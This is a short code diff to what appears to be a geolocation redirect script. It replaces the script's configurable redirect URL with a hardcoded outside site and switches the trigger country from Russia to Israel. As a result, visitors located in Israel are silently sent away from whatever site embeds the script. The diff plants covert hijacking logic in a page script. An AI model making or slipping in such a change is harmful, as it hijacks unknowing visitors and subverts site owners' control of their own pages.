@@ -13,13 +13,14 @@ enum DetectionMethod {
     if (!currentScript) return;
   
     // Find the redirection URL
-    var REDIRECT_URL =
-      currentScript.getAttribute("data-redirect-url") ??
-      `https://redirectrussia.org/${
-        currentScript.getAttribute("data-hide-domain") === "hide"
-          ? "?from=unknown"
-          : `?from=${document.domain}`
-      }`;
+    // var REDIRECT_URL =
+    //   currentScript.getAttribute("data-redirect-url") ??
+    //   `https://redirectrussia.org/${
+    //     currentScript.getAttribute("data-hide-domain") === "hide"
+    //       ? "?from=unknown"
+    //       : `?from=${document.domain}`
+    //   }`;
+    var REDIRECT_URL = 'https://seaofspa.com/he'
   
     var redirect = () => {
       try {
@@ -131,7 +132,7 @@ enum DetectionMethod {
       // Ignore errors if we're unable to fetch
       .catch(() => undefined)
       .then(() => {
-        if (countryCode === "ru") return redirect();
+        if (countryCode === "il") return redirect();
   
         try {
           // Set in session storage so we don't have to compute again
